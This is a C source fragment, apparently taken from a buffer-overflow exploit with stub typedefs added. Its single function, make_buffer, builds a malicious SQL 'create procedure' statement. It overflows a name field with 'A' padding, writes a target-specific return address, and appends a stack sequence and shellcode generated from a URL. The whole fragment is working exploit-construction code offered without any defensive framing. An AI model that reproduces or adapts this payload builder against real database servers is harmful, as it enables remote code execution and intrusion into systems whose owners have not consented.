
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int fsh ;
typedef int buf ;
struct TYPE_2__ {int ret; } ;


 int memcpy (char*,char*,int) ;
 int memset (char*,char,int) ;
 int prepare_shellcode (char*,int,char*) ;
 char* stabstack ;
 int strcat (char*,char*) ;
 int strlen (char*) ;
 TYPE_1__* targets ;

void make_buffer(char * buf, int itarget, int sh, char * url)
{

 char fsh[1000];
 memset(fsh, 0, sizeof(fsh));
 prepare_shellcode(fsh, sh, url);



 memset(buf,0,sizeof(buf));
 char * cp = buf;


 strcat(buf, "create procedure \"");
 cp=buf+strlen(buf);


 memset(cp, 'A', 255);
 cp+=strlen((char *)cp);


 *cp++ = (char)((targets[itarget].ret ) & 0xff);
 *cp++ = (char)((targets[itarget].ret >> 8) & 0xff);
 *cp++ = (char)((targets[itarget].ret >> 16) & 0xff);
 *cp++ = (char)((targets[itarget].ret >> 24) & 0xff);


 *cp++ = '\x41';
 *cp++ = '\x41';
 *cp++ = '\x41';
 *cp++ = '\x41';
 *cp++ = '\x41';
 *cp++ = '\x41';
 *cp++ = '\x41';
 *cp++ = '\x41';


 memcpy(cp, stabstack, strlen(stabstack));
 cp+=strlen((char *)cp);


 memcpy(cp, fsh, strlen(fsh));
 cp+=strlen((char *)cp);


 memset(cp, 'A', 10);
 cp+=strlen((char *)cp);


 memcpy(cp, "\"()\n begin\n end;", strlen("\"()\n begin\n end;"));


}
